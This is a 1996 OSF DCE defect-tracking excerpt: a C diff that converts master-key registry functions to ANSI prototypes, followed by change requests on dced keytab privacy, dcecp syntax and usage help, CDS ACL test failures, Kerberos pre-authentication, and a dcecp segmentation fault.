      sec_rgy_name_t          old_master_key_file;
  
***************
*** 654,677 ****
   * consistency among all replicas)
    */
  PRIVATE void rs_mkey_reencrypt_acct_key
- #ifndef __STDC__
-     ( cursor, old_eblock, old_version, new_eblock, new_version, st_p )
-     sec_rgy_cursor_t            *(cursor);      /* [in, out] */
-     krb5_encrypt_block          *old_eblock;    /* [in] */
-     krb5_kvno                   old_version;    /* [in] */
-     krb5_encrypt_block          *new_eblock;    /* [in] */
-     krb5_kvno                   new_version;    /* [in] */
-     error_status_t              *st_p;          /* [out] */
- #else
      (
      sec_rgy_cursor_t            *(cursor),      /* [in, out] */
!     krb5_encrypt_block          *old_eblock,
!     krb5_kvno                   old_version,
!     krb5_encrypt_block          *new_eblock,
!     krb5_kvno                   new_version,
!     error_status_t              *st_p
      )
- #endif
  {
      sec_rgy_login_name_t        login_name;
      sec_rgy_acct_key_t          name_parts;
--- 595,608 ----
   * consistency among all replicas)
    */
  PRIVATE void rs_mkey_reencrypt_acct_key
      (
      sec_rgy_cursor_t            *(cursor),      /* [in, out] */
!     krb5_encrypt_block          *old_eblock,	/* [in] */
!     krb5_kvno                   old_version,	/* [in] */
!     krb5_encrypt_block          *new_eblock,	/* [in] */
!     krb5_kvno                   new_version,	/* [in] */
!     error_status_t              *st_p		/* [out] */
      )
  {
      sec_rgy_login_name_t        login_name;
      sec_rgy_acct_key_t          name_parts;
***************
*** 799,820 ****
   *  This lock will be promoted and demoted during operation execution.
   */
  PRIVATE void rs_mkey_reencrypt_db_keys
- #ifndef __STDC__
-     ( old_eblock, old_version, new_eblock, new_version, st )
-     krb5_encrypt_block          *old_eblock;    /* [in] */
-     krb5_kvno                   old_version;    /* [in] */
-     krb5_encrypt_block          *new_eblock;    /* [in] */
-     krb5_kvno                   new_version;    /* [in] */
-     error_status_t              *(st);
- #else
      (
!     krb5_encrypt_block          *old_eblock,
!     krb5_kvno                   old_version,
!     krb5_encrypt_block          *new_eblock,
!     krb5_kvno                   new_version,
!     error_status_t              *(st)
      )
- #endif
  {
      unsigned32              i;
      sec_rgy_cursor_t        cursor;
--- 730,742 ----
   *  This lock will be promoted and demoted during operation execution.
   */
  PRIVATE void rs_mkey_reencrypt_db_keys
      (
!     krb5_encrypt_block          *old_eblock,	/* [in] */
!     krb5_kvno                   old_version,	/* [in] */
!     krb5_encrypt_block          *new_eblock,	/* [in] */
!     krb5_kvno                   new_version,	/* [in] */
!     error_status_t              *(st)		/* [out] */
      )
  {
      unsigned32              i;
      sec_rgy_cursor_t        cursor;
***************
*** 865,880 ****
   *  (with, in essence, a global write lock).
   */
  PUBLIC void rs_mkey_create
- #ifndef __STDC__
-     ( rgy_local_cell, keyseed )
-     sec_id_t            *rgy_local_cell;     /* [in] */
-     char                *keyseed;            /* [in] */
- #else
    (
!     sec_id_t            *rgy_local_cell,
!     char                *keyseed
    )
- #endif
  {
      char                    *mkey_name = n_master_key;
      char                    *realm;
--- 787,796 ----
   *  (with, in essence, a global write lock).
   */
  PUBLIC void rs_mkey_create
    (
!     sec_id_t            *rgy_local_cell,	/* [in] */
!     char                *keyseed		/* [in] */
    )
  {
      char                    *mkey_name = n_master_key;
      char                    *realm;
***************
*** 1009,1024 ****
   *  
   */
  PUBLIC void rs_mkey_init
- #ifndef __STDC__
-     ( rep_state, st_p )
-     unsigned32          rep_state;      /* [in] */
-     error_status_t      *st_p;          /* [out] */
- #else
    (
!     unsigned32          rep_state,
!     error_status_t      *st_p
    )
- #endif
  {
      sec_rgy_name_t          old_master_key_file;
      boolean32               old_mkey_file_exists = false;
--- 925,934 ----
   *  
   */
  PUBLIC void rs_mkey_init
    (
!     unsigned32          rep_state,		/* [in] */
!     error_status_t      *st_p			/* [out] */
    )
  {
      sec_rgy_name_t          old_master_key_file;
      boolean32               old_mkey_file_exists = false;
***************
*** 1094,1107 ****
   *  This operation must be invoked with the global write lock.
   */
  PUBLIC void rs_mkey_store_in_db
- #ifndef __STDC__
-     ( st_p )
-     error_status_t      *st_p;
- #else
    (
      error_status_t      *st_p
    )
- #endif
  {
      /* Encrypt master_key and store in database for
       * master_key verification routine.
--- 1004,1012 ----
***************
*** 1125,1137 ****
   *  so that the master_key doesn't change during the operation.
   */
  PUBLIC void rs_mkey_verify
- #ifndef __STDC__
-     ( mkey, mkey_version, eblock, st_p )
-     krb5_keyblock           *mkey;          /* [in] */
-     krb5_kvno               mkey_version;   /* [in] */
-     krb5_encrypt_block      *eblock;        /* [in] */
-     error_status_t          *st_p;          /* [out] */
- #else
      (
      krb5_keyblock           *mkey,
      krb5_kvno               mkey_version,
--- 1030,1035 ----
***************
*** 1138,1144 ****
      krb5_encrypt_block      *eblock,
      error_status_t          *st_p
      )
- #endif
  {
      rsdb_encrypt_key_t          encrypted_mkey;
      krb5_encrypted_keyblock     ekey;
--- 1036,1041 ----
***************
*** 1197,1214 ****
   *  so that the master_key doesn't change during the operation.
   */
  PUBLIC void rs_mkey_encrypt_with_master
- #ifndef __STDC__
-     ( in, out, st_p )
-     krb5_keyblock               *in;        /* [in] */
-     krb5_encrypted_keyblock     *out;       /* [in, out] */
-     error_status_t              *st_p;      /* [out] */
- #else
      (
      krb5_keyblock               *in,
      krb5_encrypted_keyblock     *out,
      error_status_t              *st_p
      )
- #endif
  {
      CLEAR_STATUS(st_p);
   
--- 1094,1104 ----
***************
*** 1233,1245 ****
   *  so that the master_key doesn't change during the operation.
   */
  PUBLIC void rs_mkey_decrypt_with_master
- #ifndef __STDC__
-     ( mkey_version, in, out, st_p )
-     krb5_kvno                   mkey_version;
-     krb5_encrypted_keyblock     *in;
-     krb5_keyblock               *out;
-     error_status_t              *st_p;
- #else
      (
      krb5_kvno                   mkey_version,
      krb5_encrypted_keyblock     *in,
--- 1123,1128 ----
***************
*** 1246,1252 ****
      krb5_keyblock               *out,
      error_status_t              *st_p
      )
- #endif
  {
      if(mkey_version == master_key_version)
          rs_mkey_decrypt_key(&master_encblock, in, out, st_p);
--- 1129,1134 ----
***************
*** 1257,1268 ****
          dce_svc_printf(SEC_RS_MKEY_UNKNOWN_MSG);
  }
  
  
  
  /*
   *  r s _ m k e y _ r a n d o m
   *
!  *  Generate a random DES key.
   *
   *  Lock Notes:
   *  A database (lock_db) read lock is required for this operation
--- 1139,1164 ----
          dce_svc_printf(SEC_RS_MKEY_UNKNOWN_MSG);
  }
  
+ /*
+  *  r s _ m k e y _ r a n d o m
+  *
+  *  Generate a random DES key in a krb5 keyblock.
+  *
+  */
  
+ PUBLIC error_status_t rs_mkey_random_keyblock (
+     krb5_keyblock **random_key
+ )
+ {
+     error_status_t st;
  
+     return krb5_random_key(rblock.eblock, rblock.rseed, random_key);
+ }
+ 
  /*
   *  r s _ m k e y _ r a n d o m
   *
!  *  Generate a random DES key in a sec_passwd_rec_t
   *
   *  Lock Notes:
   *  A database (lock_db) read lock is required for this operation
***************
*** 1269,1289 ****
   *  so that the master_key doesn't change during the operation.
   */
  PUBLIC void rs_mkey_random
- #ifndef __STDC__
-     ( passwd, st_p )
-     sec_passwd_rec_t    *passwd;             /* [in, out] */
-     error_status_t      *st_p;
- #else
    (
      sec_passwd_rec_t    *passwd,
      error_status_t      *st_p
    )
- #endif
  {
      krb5_keyblock       *random_key_p;
  
!     if (*st_p = krb5_random_key(rblock.eblock, rblock.rseed,
!                               &random_key_p))
          return;
      PASSWD_TYPE(passwd) = sec_passwd_des;
      bcopy(random_key_p->contents, DES_PASSWD(passwd),
--- 1165,1178 ----
   *  so that the master_key doesn't change during the operation.
   */
  PUBLIC void rs_mkey_random
    (
      sec_passwd_rec_t    *passwd,
      error_status_t      *st_p
    )
  {
      krb5_keyblock       *random_key_p;
  
!     if (*st_p = rs_mkey_random_keyblock (&random_key_p))
          return;
      PASSWD_TYPE(passwd) = sec_passwd_des;
      bcopy(random_key_p->contents, DES_PASSWD(passwd),
***************
*** 1291,1298 ****
      krb5_free_keyblock(random_key_p);
  }
  
- 
- 
  /*
   *  r s _ m k e y _ s t r i n g _ t o _ k e y
   *
--- 1180,1185 ----
***************
*** 1308,1321 ****
   *  so that the master_key doesn't change during the operation.
   */
  PUBLIC void rs_mkey_string_to_key
- #ifndef __STDC__
-     ( keytype, pwd_data, pepper, key, st_p )
-     krb5_keytype        keytype;        /* [in] */
-     krb5_data           *pwd_data;      /* [in] */
-     krb5_data           *pepper;        /* [in] */
-     krb5_keyblock       *key;           /* [out] */
-     error_status_t      *st_p;          /* [out] */
- #else
    (
      krb5_keytype        keytype,
      krb5_data           *pwd_data,
--- 1195,1200 ----
***************
*** 1323,1329 ****
      krb5_keyblock       *key,
      error_status_t      *st_p
    )
- #endif
  {
      CLEAR_STATUS(st_p);
  
--- 1202,1207 ----
***************
*** 1343,1356 ****
   *  This operation should be called with the GLOBAL_RIW lock.
   */
  PUBLIC void rs_mkey_change
- #ifndef __STDC__
-     ( st_p )
-     error_status_t          *st_p;
- #else
      (
      error_status_t          *st_p
      )
- #endif
  {
      sec_rgy_name_t          old_master_key_file;
      error_status_t          tmp_status;
--- 1221,1229 ----
***************
*** 1462,1470 ****
   *  This operation should be called with the GLOBAL_RIW lock.
   */
  PUBLIC void rs_mkey_purge (
- #ifdef __STDC__
      void
- #endif
  )
  {
      krb5_free_keyblock(master_keyblock_p);
--- 1335,1341 ----


[public 09/24/96]

This was fixed in 1.1 maintenance tree in February.



CR Number                     : 13342
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : keytab
Short Description             : privacy not always needed
Reported Date                 : 2/20/96
Found in Baseline             : 1.1,1.2.1
Found Date                    : 2/20/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/20/96 public]

{Note the interest list.}

All keytab operations require privacy.  Only those that actually
transmit keys should really require it.  Those that don't need it:
	create/import
	delete
	get_list
The last two are a simple matter of remove the
    if (!dced_privacy_ok(h, st))
	return;
statement.  The first will require moving it around a bit.

Without doing this a server that wants to be totally integrated with
must do something like use an ERA to store the keytab for the time
when it is started w/o DCED.



CR Number                     : 13333
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : dce_server_sec_begin
Short Description             : should maintain context
Reported Date                 : 2/17/96
Found in Baseline             : 1.1
Found Date                    : 2/17/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/17/96 public]

The dce_server_sec_begin routine, if asked to do a "login", should
spawn a thread to maintain the login context.



CR Number                     : 13325
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : 
Short Description             : "dcecp [-s] script_name" syntax doesn't work
Reported Date                 : 2/16/96
Found in Baseline             : 1.1, 1.2
Found Date                    : 2/16/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 16691
Transarc Status               : open

[2/16/96 public]
The dcecp ref page lists "dcecp [-s] script_name" as one of the
possibilities in the Synopsis.  This syntax will not work; the Tcl
code looks for the script name as the first argument on the command
line.  If it doesn't find a script, it assumes the rest of the command
line includes only switches and it enters interactive mode rather than
running the script.  The correct syntax is "dcecp script_name [-s]"
and the ref page should be corrected to reflect this.
Added field Transarc Deltas with value `16691' 
Added field Transarc Status with value `open'

[2/20/96 public]

Good catch, but off the mark.  The syntax *should* work.  There
is some problem in the parsing code that is not allowing this.

Reassigned as a code bug.



CR Number                     : 13321
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : 
Short Description             : Return name field in account and pgo 'show' command
Reported Date                 : 2/16/96
Found in Baseline             : 1.1, 1.2
Found Date                    : 2/16/96
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : nextrel
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/16/96 public]

I pretty much remember the reasons behind not returning the 'name'
parameter of an account, principal, group, and organization during
the 'show' operation.

We're being hit with a number of requests to do so, however.  There
is precedence... The 'registry show' command gives the registry name
(and I *know* why, since you don't always know for sure which replica
is answering the request).  The 'server show' command returns the
server name.  There are a couple other obscure commands that do also
(cdscache show -clearinghouse).

Users looking for a real short cut want to do

   dcecp> principal show [principal catalog]
           :
           :
   dcecp>

which works fine, but the output is just a concatenated list of 
principal info without the names, making it impossible to tell
which info belongs to which principal.

Yes, you can write a quick, easy tcl script which will do just
what the users want, thus, the 'D' (minor) severity.

My question mainly is, are there reasons not to do this as
an enhancement to the account and pgo 'show' commands?

[2/16/96 public]
It was consistency, we weren't doing it for all so we didn't do it for any.  
The fact that it snuck in for a few doesn't surprise me.  Since you had to 
know the name to get the info it seems redundant and a waste of space to 
return it to the user.  As you say, it's a simple script.  Make the trade 
off between what needs to be in the reference source and what users can 
easily add.   In another sense, what needs to be done in C code versus what
could be done in Tcl.  If you can do it in Tcl, do so.  

Maybe the better answer is to provide the script with the reference code as 
a task script.



CR Number                     : 13320
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : 
Short Description             : Add on-line usage
Reported Date                 : 2/16/96
Found in Baseline             : 1.1, 1.2
Found Date                    : 2/16/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : nextrel
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/16/96 public]

   We've had a number of requests to support 'on-line' usage
for dcecp.  There are a number of ways to do it, so I'd
like to get some feedback (by friday 2/23, please).

A. The first school of thought is, on-line usage is aready
   supported, as long as $MANPATH is set correctly...

      dcecp> man dcecp_principal
      Reformatting entry.  Wait...
                :
                :
      dcecp>

   In the SYNOPSIS section IS the usage for all the operations
   of the specified command.

   I'm happy with this, but it isn't what some of the
   customers have in mind.

B. For general dcecp usage, a new option on the command
   line would be easy...

      # dcecp -usage
      dcecp [-s] [-local] [-c command | scriptname]
      #

C. Using the 'help' operation, the main question is, should
   there be support for usage at the 'command' level or the
   'operation' level, or both.

   At the command level, for example:

      dcecp> principal help -usage
      principal catalog [cell_name] [-simplename]
      principal create princ_name_list [-attribute attribute_list | -attribute value]
      principal delete princ_name_list
            :
            :
      dcecp>

   At the operation level, for example:

      dcecp> principal help modify -usage
      principal modify princ_name_list
         {-add attribute_list |
          -remove attribute_list [-types] |
          -change attribute_list | -attribute value}
      dcecp>

D. We can bypass 'help' completely and make usage available directly
   at the 'command' level or the 'operation' level, or both.

   At the command level, for example:

      dcecp> principal -usage
      principal catalog [cell_name] [-simplename]
      principal create princ_name_list [-attribute attr_list | -attribute value]
      principal delete princ_name_list
                 :
                 :
      dcecp>

   At the operation level, for example:

      dcecp> principal modify -usage
      principal modify princ_name_list
         {-add attribute_list |
          -remove attribute_list [-types] |
          -change attribute_list | -attribute value}
      dcecp>

Below, '2' or '5' more closely matches what people seem to be looking
for (So, how do I use 'server create' again?), but the thought of adding
'-usage' to *every* operation (5), as opposed to just at the 'help operations'
level (2) makes me queezy:

      1. principal help [operation | -verbose | -usage]

      2. principal help [operation [-usage] | -verbose]

      3. principal help [operation [-usage] | -verbose | -usage]

      4. principal [-usage]

      5. principal operation [-usage]...

      6. principal {-usage | operation [-usage]...}

Now that I think about it, another way to do this would be
to create a new 'usage' operation, which would be similar
to help, but return the usage information instead:

      dcecp> principal usage
      principal catalog [cell_name] [-simplename]
      principal create princ_name_list [-attribute attr_list | -attribute value]
      principal delete princ_name_list
                 :
                 :
      dcecp>

      and

      dcecp> principal usage modify
      principal modify princ_name_list
         {-add attribute_list |
          -remove attribute_list [-types] |
          -change attribute_list | -attribute value}
      dcecp>

Such choices.

[2/16/96 public]
Burati has been asking for this, so you might check with him to see what
he would like.

A.  Agree with you completely.
B.  dcecp at least used to support getopt style options.  That is 
    single character only where the order doesn't matter.  I don't
    think a usage message for this is that necessary.  Maybe a -h or
    if bad args are given...
C.  I would do it at the operation level only.  Users could do:

       dcecp> foreach o in [principal operations]
       > puts principal help $o -usage

    if they wanted usage for every object operation pair.  I would suspect
    that if they don't know what the object does they'd rather have
    help or help -verbose info rather than usage for each operation.
D.  
    1. Okay, but is it useful?
    2. Seems the best
    3. Same as 1.
    4. Bad, after objects comes an operation not an option.
    5. I agree with your queesyness
    6. principal {-usage | operation [-usage]...}

I like the idea of a usage operation on each object just like a help
operation.  I would make the operation argument required.

    principal usage modify

Another thing to consider is how easy it is to both implement it for 
yourself and how easy is it to build a system that when people extend 
it will continue to use your conventions.  When people write task objects
how easy is it for them to include a help command (don't we provide some
framework for them to use/follow?)  Could we duplicate that for a usage
operation.  Could we do it easier by incorporating a -usage option on
the help operation?



CR Number                     : 13318
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : CDSCP syntax error arrow misplaced
Reported Date                 : 2/15/96
Found in Baseline             : 1.1
Found Date                    : 2/15/96
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/15/96 public]

When a CDSCP create directory command is given with a total directory name 
length (including the cell name but not the /.:/ or /.../ prefix) of more than
373 characters, the command fails with a syntax error.  The error which
indicates the location of the arrow points to character 304.  If you shorten
the name to 373 characters, the command succeeds, indicating the error
occurred at the 374th character, not 304.



CR Number                     : 13307
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : failure of dcecdsacl6 test
Reported Date                 : 2/7/96
Found in Baseline             : 1.2.1
Found Date                    : 2/7/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/7/96 public]

This is a derivative of OT# 13209 with different characteristics.  It
appears that the clearinghouse reference in 13209 may be fixed, but
'rights' is still a problem.
(see attached):

520|0 0 15472 1 3|Initializing cell: /.../dce1.2-960202
520|0 0 15472 1 4|add group  st_tg in the /.../dce1.2-960202 registry
520|0 0 15472 1 5|add group  systest/st_admin in the /.../dce1.2-960202 registry
520|0 0 15472 1 6|add org  st_osf in the /.../dce1.2-960202 registry
520|0 0 15472 1 7|add principal  st_admin1 st_admin2 st_admin3 st_admin4 st_admi
n5 in the /.../dce1.2-960202 registry
520|0 0 15472 1 8|add account  st_admin1 st_admin2 st_admin3 st_admin4 st_admin5
 in the /.../dce1.2-960202 registry
520|0 0 15472 1 9|add principal  st_p1 st_p2 st_p3 st_p4 st_p5 st_p6 st_p7 st_p8
 st_p9 st_p10 in the /.../dce1.2-960202 registry
520|0 0 15472 1 10|add account  st_p1 st_p2 st_p3 st_p4 st_p5 st_p6 st_p7 st_p8
st_p9 st_p10 in the /.../dce1.2-960202 registry
520|0 0 15472 1 11|     Modifying acls on /.../dce1.2-960202
520|0 0 15472 1 12|     Modifying acls on /.../dce1.2-960202/blu2_ch
520|0 0 15472 1 13|This host: blu2 is a CDS server already
520|0 0 15472 1 14|     Modifying acls on /.../dce1.2-960202/hosts/blu2/cds-serv
er
520|0 0 15472 1 15|HOST: ibm_l3 is not a CDS server
520|0 0 15472 1 16|HOST: knuckle is not a CDS server
400|0 1 1 00:01:17|IC Start
200|0 1 00:01:17|TP Start
520|0 1 15472 1 17|Starting iteration 1
520|0 1 15472 1 18|Running STATE Series: st1
520|0 1 15472 1 19|Running STATE Series: st2
520|0 1 15472 1 20|Running STATE Series: st3
520|0 1 15472 1 21|Running STATE Series: st4
520|0 1 15472 1 22|Running STATE Series: st5
520|0 1 15472 1 23|Running STATE Series: st6
520|0 1 15472 1 24|Running STATE Series: st7
520|0 1 15472 1 25|Running STATE Series: st8
520|0 1 15472 1 26|Running STATE Series: st9
520|0 1 15472 1 27|Running STATE Series: st10
520|0 1 15472 1 28|Starting iteration 2
520|0 1 15472 1 29|Running STATE Series: st1
520|0 1 15472 1 30|Authenticated as st_admin1
520|0 1 15472 1 31|blu2_ch.st1: st_admin1 user command list and expected results
:
520|0 1 15472 1 32|cdscp create directory $CELL/$CDSSHOST clearinghouse $CELL/$C
HS pass
520|0 1 15472 1 33|acl_edit $CELL/$CDSSHOST -m user:st_admin2:rwdtcia pass
520|0 1 15472 1 34|acl_edit $CELL/$CDSSHOST -m user:st_admin3:rwdtcia pass
520|0 1 15472 1 35|acl_edit $CELL/$CDSSHOST -m user:st_admin4:rwdtcia pass
520|0 1 15472 1 36|acl_edit $CELL/$CDSSHOST -m user:st_admin5:rwdtcia pass
520|0 1 15472 1 37|cdscp create directory $CELL/$CDSSHOST/systest1 clearinghouse
 $CELL/$CHS pass
520|0 1 15472 1 38|cdscp set directory $CELL to skulk pass
520|0 1 15472 1 39|
520|0 1 15472 1 40|st_admin1 test execution follows...
520|0 1 15472 1 41|cdscp create directory /.../dce1.2-960202/blu2 clearinghouse
/.../dce1.2-960202/blu2_ch
520|0 1 15472 1 42|ERROR:Output from command:
520|0 1 15472 1 43|Error on entity: /.../dce1.2-960202/blu2
520|0 1 15472 1 44|Insufficient rights to perform requested operation
520|0 1 15472 1 45|Function: dnsCreateDir
520|0 1 15472 1 46|
520|0 1 15472 1 47|st_admin1 cmd return:fail expected:pass
520|0 1 15472 1 48|acl_edit /.../dce1.2-960202/blu2 -m user:st_admin2:rwdtcia
520|0 1 15472 1 49|ERROR:Output from command:
520|0 1 15472 1 50|ERROR: acl object not found (dce / sec)
520|0 1 15472 1 51|Unable to bind to object /.../dce1.2-960202/blu2
520|0 1 15472 1 52|st_admin1 cmd return:fail expected:pass
520|0 1 15472 1 53|acl_edit /.../dce1.2-960202/blu2 -m user:st_admin3:rwdtcia
520|0 1 15472 1 54|ERROR:Output from command:
520|0 1 15472 1 55|ERROR: acl object not found (dce / sec)
520|0 1 15472 1 56|Unable to bind to object /.../dce1.2-960202/blu2
520|0 1 15472 1 57|st_admin1 cmd return:fail expected:pass
520|0 1 15472 1 58|acl_edit /.../dce1.2-960202/blu2 -m user:st_admin4:rwdtcia
520|0 1 15472 1 59|ERROR:Output from command:
520|0 1 15472 1 60|ERROR: acl object not found (dce / sec)
520|0 1 15472 1 61|Unable to bind to object /.../dce1.2-960202/blu2
520|0 1 15472 1 62|st_admin1 cmd return:fail expected:pass
520|0 1 15472 1 63|acl_edit /.../dce1.2-960202/blu2 -m user:st_admin5:rwdtcia
520|0 1 15472 1 64|ERROR:Output from command:
520|0 1 15472 1 65|ERROR: acl object not found (dce / sec)
520|0 1 15472 1 66|Unable to bind to object /.../dce1.2-960202/blu2
520|0 1 15472 1 67|st_admin1 cmd return:fail expected:pass
520|0 1 15472 1 68|cdscp create directory /.../dce1.2-960202/blu2/systest1 clear
inghouse /.../dce1.2-960202/blu2_ch
520|0 1 15472 1 69|ERROR:Output from command:
520|0 1 15472 1 70|Error on entity: /.../dce1.2-960202/blu2/systest1
520|0 1 15472 1 71|Insufficient rights to perform requested operation
520|0 1 15472 1 72|Function: dnsCreateDir
520|0 1 15472 1 73|
520|0 1 15472 1 74|st_admin1 cmd return:fail expected:pass
520|0 1 15472 1 75|cdscp set directory /.../dce1.2-960202 to skulk
520|0 1 15472 1 76|ERROR:Output from command:
520|0 1 15472 1 77|Error on entity: /.../dce1.2-960202
520|0 1 15472 1 78|Insufficient rights to perform requested operation
520|0 1 15472 1 79|Function: dnsSkulkDir
520|0 1 15472 1 80|
520|0 1 15472 1 81|st_admin1 cmd return:fail expected:pass
520|0 1 15472 1 82|st_admin1 failed: 1) cdscp create directory $CELL/$CDSSHOST c
learinghouse $CELL/$CHS
520|0 1 15472 1 83|st_admin1 failed: 2) acl_edit $CELL/$CDSSHOST -m user:st_admi
n2:rwdtcia
520|0 1 15472 1 84|st_admin1 failed: 3) acl_edit $CELL/$CDSSHOST -m user:st_admi
n3:rwdtcia
520|0 1 15472 1 85|st_admin1 failed: 4) acl_edit $CELL/$CDSSHOST -m user:st_admi
n4:rwdtcia
520|0 1 15472 1 86|st_admin1 failed: 5) acl_edit $CELL/$CDSSHOST -m user:st_admi
n5:rwdtcia
520|0 1 15472 1 87|st_admin1 failed: 6) cdscp create directory $CELL/$CDSSHOST/s
ystest1 clearinghouse $CELL/$CHS
520|0 1 15472 1 88|st_admin1 failed: 7) cdscp set directory $CELL to skulk
520|0 1 15472 1 89|blu2_ch.st1 st_admin1 Total failures: 7 out of 7 operations
520|0 1 15472 1 90|



CR Number                     : 13305
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : dce_login,kinit
Short Description             : Pre-auth fails for kinit,
succeeds for dce_login
Reported Date                 : 2/6/96
Found in Baseline             : 1.1
Found Date                    : 2/6/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/6/96 public]

A support customer reported the following:

    Also, my real problem which I reported is that the ERROR_REP to the AS_REQ
does not include the e_data field with the correct salt.  It returns the error
31 which is a BAD INTEGRITY error, instead of a PREAUTHENTICATION error.  
This happens when I attempt preauthentication with the wrong salt, and also
when I do not do authentication at all.   RFC 1510 states that the ERROR_REP
should contain both an authentication error and return the salt in the e_data
field.  This seems to work okay with dce_login but does not work with kinit.


Repeat By:

	Use the DCE security API to create an account with a password which
uses a non-standard pepper.  Set the pre_auth_req extended attribute for the
principal.  dce_login will succeed.  kinit will fail with invalid password.

[2/7/96 public]

I think this may be a defect, but I would like to make sure of
one thing.

What value is the pre_auth_req ERA set to? If it is set to 2 (DCE Third
Party), then the user will not be able to get a TGT with kinit even if the
salt is a default. This is because kinit uses Krb5 timestamps preauthentication,
which is less secure.

Make sure the pre_auth_req ERA is set to 0 or 1. Please let me know if
kinit still fails.

[2/9/96 public]

The customer reports kinit is failing when :

>   The pre_auth_req is set to 1.



CR Number                     : 13304
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : erarel001 sometimes errors and FAILS
Reported Date                 : 2/6/96
Found in Baseline             : 1.2.1
Found Date                    : 2/6/96
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/6/96 public]

During system testing, erarel001 sometimes fails with the following 
message:
	|Attempting to remove seaclcliblu20prin members from group without permission
	|ERROR: Able to remove member seaclcliblu20prin from group unexpectedly in remove_neg_from_group_or_org
	|ERROR: Some members have been removed unexepectedly from group in remove_neg_from_group_or_org

This does not stop all tests or cause major problems, but it is an intermittent
failure during testing.



CR Number                     : 13303
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : dcecp
Subcomponent Name             : 
Short Description             : core dump when env setting as root
Reported Date                 : 2/6/96
Found in Baseline             : 1.1, 1.2
Found Date                    : 2/6/96
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/6/96 public]
Do the following AS ROOT:

    # dcecp
    Warning: couldn't find HOME environment variable to expand "~/.dcecprc"
    dcecp> set env(a) {aaaaaaaaaa}
    aaaaaaaaaa
    dcecp> set env(b) {aaaaaaaaaa} 
    aaaaaaaaaa
    dcecp> set env(c) {aaaaaaaaaa} 
    aaaaaaaaaa
    dcecp> set env(d) {aaaaaaaaaa} 
    Segmentation fault

[2/7/96 public]

Sigh.  Haven't looked closely yet, but the traceback on HP is:

> trace
 0 ltostr@libc.1 + 0x0000012c (0x7b03afe2, 0x7b03b500, 0x4000b030, 0x7b03a348)
 1 free@libc.1 + 0x000001fc (0x7b03afe0, 0x7b03b43c, 0x4007d860, 0x12778)
 2 TclSetEnv (name = 0x7b03afe0, value = 0x4007d888)
      [/vob/dce/src/admin/tcl_dce/tclEnv.c: 277]
 3 EnvTraceProc (clientData =   00000000, interp = 0x4002cf70, name1 = 0x7b03afdc,
                 name2 = 0x7b03afe0, flags = 32)
      [/vob/dce/src/admin/tcl_dce/tclEnv.c: 508]
 4 CallTraces (iPtr = 0x4002cf70, arrayPtr = 0x4002f5d0, varPtr = 0x4007d860,
               part1 = 0xfb03afdc, part2 = 0x7b03afe0, flags = 32)
